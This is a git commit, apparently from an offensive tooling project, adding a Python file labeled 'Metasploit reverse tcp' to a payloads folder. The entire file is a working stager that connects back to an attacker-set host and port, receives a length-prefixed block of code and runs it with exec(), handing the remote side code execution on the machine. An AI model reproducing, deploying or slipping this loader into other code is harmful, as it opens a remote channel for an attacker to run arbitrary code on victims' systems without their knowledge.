246aac8c6ec73f94b96c5226c914b5df3a1b1e47
Renmusxd <sumnernh@gmail.com>
2017-01-03 00:48:31 -0800

    Metasploit reverse tcp payload

---
+++ server/payloads/metasploit_handler.py
@@ -0,0 +1,15 @@
+'''
+NAME: Metasploit reverse tcp
+DESCRIPTION: Connects back to a server in a generic way for metasploit handlers
+VAR LHOST: Metasploit host ip
+VAR LPORT: Metasploit host port
+'''
+
+import socket,struct
+s=socket.socket(2,1)
+s.connect((LHOST,int(LPORT)))
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(4096)
+while len(d)!=l:
+    d+=s.recv(4096)
+exec(d,{'s':s})
